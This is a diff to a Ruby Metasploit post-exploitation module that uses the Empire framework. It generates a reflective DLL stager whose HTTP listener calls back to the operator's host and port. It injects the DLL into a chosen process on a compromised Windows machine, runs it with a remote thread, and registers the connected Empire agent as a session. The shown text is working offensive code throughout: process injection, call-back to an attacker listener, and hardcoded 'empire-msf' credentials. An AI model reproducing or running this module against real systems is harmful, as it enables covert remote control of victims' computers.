@@ -22,25 +22,43 @@ class MetasploitModule < Msf::Post
                      ))
     register_options(
       [
-        OptAddress.new('LHOST',[true, 'Host to start the listener on']),
-        OptPort.new('LPORT',[false, 'Port for payload to connect to, make sure port is not already in use', 7878 ]),
-        OptString.new('PathToEmpire', [true, 'The Complete Path to Empire-Web API']),
-        OptInt.new('PID', [true,'Process Identifier to inject the Empire payload into'])
+        OptAddress.new('LHOST',
+                       [false, 'Host to start the listener on']),
+        OptPort.new('LPORT',
+                    [false, 'Port for payload to connect to, make sure port is not already in use', 7878 ]),
+        OptString.new('PathToEmpire',
+                      [true, 'The Complete Path to Empire-Web API']),
+        OptInt.new('PID',
+                   [true,'Process Identifier to inject the Empire payload into'])
       ])
   end
   def run
     #Storing user inputs.
+    if datastore['LHOST']
+      @host = datastore['LHOST']
+    elsif framework.datastore['LHOST']
+      @host = framework.datastore['LHOST']
+    else
+      @host = session.tunnel_local.split(':')[0]
+      if @host == 'Local Pipe'
+        print_error('LHOST is "Local Pipe", please manualy set the correct IP')
+        return
+      end
+    end
+
     path = datastore['PathToEmpire'].to_s.chomp
-    @host = datastore['LHOST'].to_s
     @port = datastore['LPORT'].to_s
     @pid = datastore['PID'].to_i
+    @listener_name = 'Listener_Emp'
 
     #Changing the working directory to the provided path
     Dir.chdir(path)
 
     #method to initiate the web-API
     def initiate_API
-      command = 'netstat -nlt|grep 1337'
+      sleep(18)
+      print_status("Initiating the Empire Web-API instance. Might take few moments")
+      command = "netstat -nlt | grep 1337"
       value = system(command)
       raise "Port 1337 already in use." if value
       command = "./empire --headless --username 'empire-msf' --password 'empire-msf' > /dev/null"
@@ -49,18 +67,15 @@ class MetasploitModule < Msf::Post
 
     #method to create the reflectivly injectable DLL
     def create_DLL
-      generate_reflective_DLL('Listener_Emp_test3',@host, @port)
+      print_status("Creating reflectively injectable Empire DLL")
+      generate_reflective_DLL(@listener_name ,@host, @port)
     end
 
     #main function
     def main
 
       #Setting up Empire
-      print_status("Initiating the Empire Web-API instance. Might take few moments")
-      sleep(17)
-      print_status("Creating empire instance")
-      client_emp = Msf::Empire::Client.new('empire-msf','empire-msf')
-      print_status("Creating reflectively injectable DLL")
+      sleep(15)
 
       #Defining the payload path
       payload_path = '/tmp/launcher-emp.dll'
@@ -72,21 +87,31 @@ class MetasploitModule < Msf::Post
       print_status("DLL Injected. Executing Reflective loader")
       host_process.thread.create(dll_mem + offset, 0)
       print_status("DLL injected and invoked")
+      print_status("Creating Empire instance")
+      sleep(20)
+      client_emp = Msf::Empire::Client.new('empire-msf','empire-msf')
 
-      #Fetching the agent at an interval of 7 seconds.
-      sleep(7)
-      agent_name = self.client_emp.get_agents(true)
+      #Fetching the agent at an interval of 10 seconds.
+      sleep(5)
+      agents = client_emp.get_agents
+      agents.each do |listener, session_id|
+        if listener == @listener_name
+          @agent_name = session_id.to_s
+          print_status("Agent Connected : #{session_id} to listener : #{@listener_name}")
+        end
+      end
 
       #Register a Windows Session
-      empire_session = Msf::Sessions::EmpireShellWindows.new(client_emp, agent_name)
+      empire_session = Msf::Sessions::EmpireShellWindows.new(client_emp, @agent_name)
       framework.sessions.register(empire_session)
+      print_status("Empire Session created")
 
     end
 
     #method to generate reflective DLL from empire-cli
     def generate_reflective_DLL(listener_name, host, port)
       dll = File.open('/root/dll_generator.rc',"w")
-      dll.puts ("listeners\nuselistener http\nset Name #{listener_name}\nset Host #{host}\nset Port #{port}\nexecute\nlisteners\nusestager windows/dll\nset Listener #{listener_name}\nset OutFile /tmp/launcher-emp.dll\ngenerate")
+      dll.puts ("listeners\nuselistener http\nset Name #{listener_name}\nset Port #{port}\nset Host http://#{host}:#{port}\nexecute\nlisteners\nusestager windows/dll\nset Listener #{listener_name}\nset OutFile /tmp/launcher-emp.dll\ngenerate")
       dll.close
       command = './empire --resource /root/dll_generator.rc > /dev/null'
       value = system(command)
